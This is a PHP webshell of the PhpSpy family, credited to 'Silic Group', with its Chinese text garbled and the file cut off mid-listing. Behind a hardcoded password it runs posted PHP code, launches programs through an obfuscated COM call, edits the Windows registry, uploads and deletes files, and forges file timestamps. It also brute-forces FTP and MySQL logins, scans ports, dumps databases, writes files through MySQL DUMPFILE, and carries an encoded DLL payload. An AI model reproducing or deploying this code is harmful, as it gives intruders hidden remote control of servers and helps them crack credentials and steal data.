<?php
error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
@set_time_limit(0);
//�ǰ�ȫģʽ����ʹ������ĺ�������ʱȡ����
/*===================== �������� =====================*/
// �Ƿ���Ҫ������֤,1Ϊ��Ҫ��֤,��������Ϊֱ�ӽ���.����ѡ������Ч
$admin['check'] = "1";
// �����Ҫ������֤,���޸ĵ�½����
$admin['pass']  = "silic";
//Ĭ�϶˿ڱ�
$hidden = "saiy";
$admin['port'] = "80,139,21,3389,3306,43958,1433,";
//��ת�õ���
$admin['jumpsecond'] = "1";
//Ftp�ƽ��õ����Ӷ˿�
$alexa = "no";
//�Ƿ���ʾalexa������yes����no
$admin['ftpport'] = "21";
// �Ƿ�����phpspy�����Զ��޸ı༭���ļ���ʱ��Ϊ����ʱ��(yes/no)
$retime = "no";
// Ĭ��cmd.exe��λ��,proc_open����Ҫʹ�õ�,linuxϵͳ���Ӧ�޸�.(������winntϵͳ�ڳ�������Ȼ����ָ��)
$cmd = "cmd.exe";
// ������phpspy��ʾ��Ȩ�����ģ���Ϊ���ܶ���򵱳���Ϊ�ؼ���ɱ�ˣ��㺮~~�����Զ���ɡ����ǲ������~~
$notice = "[<a href=\"http://www.blackbap.com\" title=\"Silic Group\">Silic Group</a>]\"><br><FONT color=#ff3300>����:����ʹ�ñ�������·Ƿ���Ϊ���������Ը���</font>";
/*===================== ���ý��� =====================*/

$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');
if ($onoff != 1) {@extract($_POST, EXTR_SKIP);@extract($_GET, EXTR_SKIP);}
$self = $_SERVER['PHP_SELF'];$dis_func = get_cfg_var("disable_functions");
/*===================== �����֤ =====================*/
if($admin['check'] == "1") {if ($_GET['action'] == "logout") {setcookie ("adminpass", "");echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";echo "<span style=\"font-size: 12px; font-family: Verdana\">ע���ɹ�......<p><a href=\"".$self."\">������Զ��˳��򵥻������˳�������� &gt;&gt;&gt;</a></span>";exit;}
if ($_POST['do'] == 'login') {$thepass=trim($_POST['adminpass']);if ($admin['pass'] == $thepass) {setcookie ("adminpass",$thepass,time()+(1*24*3600));echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";echo "<span style=\"font-size: 12px; font-family: Verdana\">��½�ɹ�......<p><a href=\"".$self."\">������Զ���ת�򵥻�������������� &gt;&gt;&gt;</a></span>";exit;}}if (isset($_COOKIE['adminpass'])) {if ($_COOKIE['adminpass'] != $admin['pass']) {loginpage();}} else {loginpage();}}
/*===================== ��֤���� =====================*/
// �ж� magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {$_GET = stripslashes_array($_GET);$_POST = stripslashes_array($_POST);}
//mix.dll�Ĵ���
$mixdll = "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";
// �鿴PHPINFO
if ($_GET['action'] == "phpinfo") {echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() �����ѱ�����,��鿴&lt;PHP��������&gt;";exit;
}if($_GET['action'] == "nowuser") {$user = get_current_user();
if(!$user) $user = "���泤�٣�������̬���޷���ȡ��ǰ�����û�����";
echo"��ǰ�����û�����$user";
exit;
}
if(isset($_POST['phpcode'])){eval("?".">$_POST[phpcode]<?");exit;
}
if($action=="mysqldown"){
	$link=@mysql_connect($host,$user,$password);
	if (!$link) {
		$downtmp = '���ݿ�����ʧ��: ' . mysql_error();
	}else{
	$query="select load_file('".$filename."');";
	$result = @mysql_query($query, $link);
	if(!$result){
		$downtmp = "��ȡʧ�ܣ��������ļ������ڻ���ûfileȨ�ޡ�<br>".mysql_error();
			}else{
	while ($row = mysql_fetch_array($result)) {
		$filename = basename($filename);
		if($rardown=="yes"){
			$zip = NEW Zip;
			$zipfiles[]=Array("$filename",$row[0]);
			$zip->Add($zipfiles,1);
			$code = $zip->get_file();
			$filename = "".$filename.".rar";
		}else{
			$code = $row[0];
		}
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=$filename");
		echo($code);
		exit;
	}
	}
	}
}
// ���ߴ���
if (isset($_POST['url'])) {$proxycontents = @file_get_contents($_POST['url']);echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>��ȡ URL ����ʧ��</b></p></center></body>";exit;
}
// �����ļ�
if (!empty($downfile)) {if (!@file_exists($downfile)) {echo "<script>alert('��Ҫ�µ��ļ�������!')</script>";} else {$filename = basename($downfile);$filename_info = explode('.', $filename);$fileext = $filename_info[count($filename_info)-1];header('Content-type: application/x-'.$fileext);header('Content-Disposition: attachment; filename='.$filename.'');header('Content-Description: PHP Generated Data');header('Content-Length: '.filesize($downfile));@readfile($downfile);exit;}
}
// ֱ�����ر������ݿ�
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "����: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// ����Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ��ȡ��ǰ·��
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// �ж϶�д���
$dir_writeable = (dir_writeable($nowpath)) ? "��д" : "����д";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">ע������</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
 <style type="text/css">
body{
	BACKGROUND-COLOR: #F5F5F5; 
	COLOR: #3F3849; 
	font-family: "Verdana", "Tahoma", "����";
	font-size: "12px";
	line-height: "140%";
}

TD		{FONT-FAMILY: "Verdana", "Tahoma", "����"; FONT-SIZE: 12px; line-height: 140%;}
.smlfont {
	font-family: "Verdana", "Tahoma", "����";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#CA0000";
}
A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}
A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}
A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>
<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Y��m��d�� h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('| <a href="?action=logout">ע����¼</a> | <a href="?action=dir">Shell Ŀ¼</a> | <a href="?action=phpenv">��������</a> | <a href="?action=proxy">���ߴ���</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=crack">�����ƽ�</a> |');
$tb->tdbody('| <a href="?action=downloads">Http �ļ�����</a> | <a href="?action=search&dir='.$dir.'">�ļ�����</a> | <a href="?action=eval">ִ��php�ű�</a> | <a href="?action=sql">ִ��SQL���</a> | <a href="?action=mysqlfun">Func����Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> | <a href="?action=mix">��ѹmix.dll</a> |');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>����·��: '.$pathname.'<br>��ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>��תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ��','','submit').' ��֧�־���·�������·����'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'�ϴ��ļ�����ǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ��','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'�½��ļ��ڵ�ǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ��','','submit')));

$tb->headerform(array('content'=>'�½�Ŀ¼�ڵ�ǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ��','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== ִ�в��� ��ʼ =====================*/
echo "<p><b>\n";
// ɾ���ļ�
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." ɾ���ɹ�!" : "�ļ�ɾ��ʧ��!";
	} else {
		echo basename($delfile)." �ļ��Ѳ�����!";
	}
}

// ɾ��Ŀ¼
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir Ŀ¼�Ѳ�����!";
	} else {
		echo (deltree($deldirs)) ? "Ŀ¼ɾ���ɹ�!" : "Ŀ¼ɾ��ʧ��!";
	}
}

// ����Ŀ¼
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "��Ŀ¼�Ѵ���!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "����Ŀ¼�ɹ�!" : "����ʧ��!";
			@chmod("$mkdirs",0777);
		}
	}
}

// �ϴ��ļ�
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "�ϴ��ɹ�!" : "�ϴ�ʧ��!";
}
elseif($action=="mysqlup"){
	$filename = $_FILES['upfile']['tmp_name'];
	if(!$filename) {
		echo"û��ѡ��Ҫ�ϴ����ļ�����";
	}else{
	$shell = file_get_contents($filename);
	$mysql = bin2hex($shell);
	if(!$upname) $upname = $_FILES['upfile']['name'];
	$shell = "select 0x".$mysql." from ".$database." into DUMPFILE '".$uppath."/".$upname."';";
	$link=@mysql_connect($host,$user,$password);
	if(!$link){
		echo "��½ʧ��".mysql_error();
	}else{
		$result = mysql_query($shell, $link);
		if($result){
			echo"�����ɹ�.�ļ��ɹ��ϴ���".$host.",�ļ���Ϊ".$uppath."/".$upname."..";
		}else{
				echo"�ϴ�ʧ�� ԭ��:".mysql_error();
			}
		}
	}

}
elseif($action=="mysqldown"){
	if(!empty($downtmp)) echo $downtmp;
}
// �༭�ļ�
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
    if(!file_exists($editfilename)) unset($retime);
	if($time==$now) $time = @filemtime($editfilename);
        $time2 = @date("Y-m-d H:i:s",$time);
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		if($_POST['change']=="yes"){
		$filecontent = "?".">".$_POST['filecontent']."<?";
		$filecontent = gzdeflate($filecontent);
        $filecontent = base64_encode($filecontent);
        $filecontent = "<?php\n/*\n������ǳ���ķ��������!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
		}else{
		$filecontent = $_POST['filecontent'];
		}
		echo $msg=@fwrite($fp,$filecontent) ? "д���ļ��ɹ�!" : "д��ʧ��!";
		@fclose($fp);
		if($retime=="yes"){
        echo"&nbsp;�����Զ�����:";
        echo $msg=@touch($filename,$time) ? "�޸��ļ�Ϊ".$time2."�ɹ�!" : "�޸��ļ�ʱ��ʧ��!";
		}
	} else {
		echo "��������Ҫ�༭���ļ���!";
	}
}
//�ļ�����
elseif ($_POST['do'] == 'downloads') {
	$contents = @file_get_contents($_POST['durl']);
	if(!$contents){
	echo"�޷���ȡҪ���ص�����";
	}
	elseif(file_exists($path)){
	echo"�ܱ�Ǹ���ļ�".$path."�Ѿ������ˣ�����������ļ�����";
	}else{
    $fp = @fopen($path,"w");
	echo $msg=@fwrite($fp,$contents) ? "�����ļ��ɹ�!" : "�����ļ�д��ʱʧ��!";
	@fclose($fp);
	}
}
elseif($_POST['action']=="mix"){
	if(!file_exists($_POST['mixto'])){
	$tmp = base64_decode($mixdll);
	$tmp = gzinflate($tmp);
	$fp = fopen($_POST['mixto'],"w");
	echo $msg=@fwrite($fp,$tmp) ? "��ѹ���ɹ�!" : "��Ŀ¼����д�ɣ�!";
	fclose($fp);
}else{
	echo"���ǰɣ�".$_POST['mixto']."�Ѿ�������Ү~";
}
}
// �༭�ļ�����
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "�����޸ĳɹ�!" : "�޸�ʧ��!";
		echo " �ļ� ".$file." �޸ĺ������Ϊ: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "��������Ҫ���õ�����!";
	}
}

// �ļ�����
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." �Ѿ�����,����������һ��!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." �ɹ�����Ϊ ".$_POST['newname']." !" : "�ļ����޸�ʧ��!";
		}
	} else {
		echo "��������Ҫ�ĵ��ļ���!";
	}
}
elseif ($_POST['do'] == 'search') {
if(!empty($oldkey)){
echo"<span class=\"redfont\">���ҹؼ���:[".$oldkey."],������ʾ���ҵĽ��:";
	if($type2 == "getpath"){
	echo"����Ƶ�����ļ��ϻ��в��ֽ�ȡ��ʾ.";
}
echo"</span><br><hr width=\"775\" noshade>";
find($path);
}else{
echo"��Ҫ��Ϻ��?����Ҫ��Ϻ����?��û��Ϻ��Ҫ�����?";
}
}
// ��¡ʱ��
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "Ҫ���յ��ļ�������!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}

// �Զ���ʱ��
elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}
elseif($do =='port'){
		$tmp = explode(",",$port);
		$count = count($tmp);
	for($i=$first;$i<$count;$i++){
			$fp = @fsockopen($host, $tmp[$i], $errno, $errstr, 1);
			if($fp) echo"����".$host."�������˶˿�".$tmp[$i]."<br>";
	}
}
/*
�������д�ú��ӣ�˵ʵ�����Լ�����֪��д��ʲô��
�������ã��Ҿ�û���ˣ��������˿����ɴ���д�ɡ�*/
elseif ($do == 'crack') {//����ע��Ϊȫ�ֱ����ˡ�
	if(@file_exists($passfile)){
		$tmp = file($passfile);
		$count = count($tmp);
		if(empty($onetime)){
			$onetime = $count;
			$turn="1";
		}else{
			$nowturn = $turn+1;
			$now = $turn*$onetime;
			$tt = intval(($count/$onetime)+1);
		}
		if($turn>$tt or $onetime>$count){
			echo"�����ֵ�������Ү~Ҫ���ƽ������̵ģ��ܱ�Ǹʧ�ܡ�";
			}else{
				$first = $onetime*($turn-1);
				for($i=$first;$i<$now;$i++){
					if($ctype=="mysql") $sa = @mysql_connect($host,$user,chop($tmp[$i]));
					else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));
				if($sa) 
					{
					$t = "��ȡ".$user."������Ϊ".$tmp[$i]."";
					}
			}
			if(!$t){
				echo "<meta http-equiv=\"refresh\" content=\"".$admin[jumpsecond].";URL=".$self."?do=crack&passfile=".$passfile."&host=".$host."&user=".$user."&turn=".$nowturn."&onetime=".$onetime."&ctype=".$ctype."\"><span style=\"font-size: 12px; font-family: Verdana\"><a href=\"".$self."?do=crack&passfile=".$passfile."&host=".$host."&user=".$user."&turn=".$nowturn."&onetime=".$onetime."&type=".$ctype."\">�ֵ��ܹ�".$count."�������ڴ�".$first."��".$now."��".$admin[jumpsecond]."��������".$onetime."���������̽. &gt;&gt;&gt;</a><br>ȫ���˴�".$type."���ƽ���Ҫ".$tt."�Σ������ǵ�".$turn."�ν��ܡ�</span>";
	}
	else {
		echo"$t";
		}
			}
}else{
			echo"�ֵ��ļ������ڣ���ȷ����";
			}
}
elseif($do =='port'){
	if(!eregi("-",$port)){
		$tmp = explode(",",$port);
		$count = count($tmp);
		$first = "1";
	}else{
		$tmp = explode("-",$port);
		$first = $tmp[0];
		$count = $tmp[1];

	}
	for($i=$first;$i<$count;$i++){
			if(!eregi("-",$port)){
			$fp = @fsockopen($host, $tmp[$i], $errno, $errstr, 1);
			if($fp) echo"����".$host."�������˶˿�".$tmp[$i]."<br>";
			}else{
				$fp = @fsockopen($host, $i, $errno, $errstr, 1);
				if($fp) echo"����".$host."�������˶˿�".$i."<br>";
			}
		}

	}
// ����MYSQL
elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "���ݿ����ӳɹ�!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִ��SQL���
elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL���ɹ�ִ��!" : "����: ".mysql_error();
	mysql_close();
}

// ���ݲ���
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "��ѡ�������ݵ����ݱ�ͱ��ݷ�ʽ!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
			@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : "����: ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "���ݿ��ѳɹ����ݵ� <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "����ʧ��,��ȷ��Ŀ���ļ����Ƿ���п�дȨ��!";
			}
		}
	}
}
elseif($downrar) {
	if (!empty($dl)) {
		if(eregi("unzipto:",$localfile)){
		$path = "".$dir."/".str_replace("unzipto:","",$localfile)."";
		$zip = new Zip;
		$zipfile=$dir."/".$dl[0];
		$array=$zip->get_list($zipfile);
		$count=count($array);
		$f=0;
		$d=0;
		for($i=0;$i<$count;$i++) {
			if($array[$i][folder]==0) {
				if($zip->Extract($zipfile,$path,$i)>0) $f++;
			}
			else $d++;
		}
		if($i==$f+$d) echo "$dl[0] ��ѹ��".$path."�ɹ�<br>($f ���ļ� $d ��Ŀ¼)";
		elseif($f==0) echo "$dl[0] ��ѹ��".$path."ʧ��";
		else echo "$dl[0] δ��ѹ����<br>(�ѽ�ѹ $f ���ļ� $d ��Ŀ¼)";
		}else{
	$zipfile="";
	$zip = new Zip;
	for($k=0;isset($dl[$k]);$k++)
		{
			$zipfile=$dir."/".$dl[$k];
			if(is_dir($zipfile))
			{
				unset($zipfilearray);
				addziparray($dl[$k]);
				for($i=0;$zipfilearray[$i];$i++)
				{
					$filename=$zipfilearray[$i];
					$filesize=@filesize($dir."/".$zipfilearray[$i]);
					$fp=@fopen($dir."/".$filename,rb);
					$zipfiles[]=Array($filename,@fread($fp,$filesize));
					@fclose($fp); 
				}
			}
			else
			{
				$filename=$dl[$k];
				$filesize=@filesize($zipfile);
				$fp=@fopen($zipfile,rb);
				$zipfiles[]=Array($filename,@fread($fp,$filesize));
				@fclose($fp);
			}
		}
		$zip->Add($zipfiles,1);
		$code = $zip->get_file();
		$ck = "_loveakira_".date("Y-m-d",time())."";
		if(empty($localfile)){
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."".$ck."_Files.zip");
		echo $code;
		exit;
		}else{
		 $fp = @fopen("".$dir."/".$localfile."","w");
		 echo $msg=@fwrite($fp,$code) ? "ѹ������".$dir."/".$localfile."���سɹ���!" : "Ŀ¼".$dir."�޿�дȨ��!";
		 @fclose($fp);
		}
		}
	} else {
		echo "��ѡ��Ҫ������ص��ļ�!";
	}
}
// Shell.Application ���г���
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "�����Ѿ��ɹ�ִ��!" : "��������ʧ��!";
}
// �鿴PHP���ò���״��
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "���ò��� ".$_POST['phpvarname']." �����: ".getphpcfg($_POST['phpvarname'])."";
}
// ��ȡע���
elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}

// д��ע���
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "д��ע���ֵ�ɹ�!" : "д�� ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." ʧ��!";
}
// ɾ��ע���
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "ɾ��ע���ֵ�ɹ�!" : "ɾ�� ".$_POST['delregname']." ʧ��!";
}
else {
	echo "$notice";
}
echo "</b></p>\n";
/*===================== ִ�в��� ���� =====================*/
if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>�ļ�</b></td>
	<td align="center" nowrap width="16%"><b>��������</b></td>
    <td align="center" nowrap width="16%"><b>����޸�</b></td>
    <td align="center" nowrap width="11%"><b>��С</b></td>
    <td align="center" nowrap width="6%"><b>����</b></td>
    <td align="center" nowrap width="24%"><b>����</b></td>
  </tr>
  <FORM action="" method="POST">
<?php
// Ŀ¼�б�
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\"><INPUT type=checkbox value=$file name=dl[]> [<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
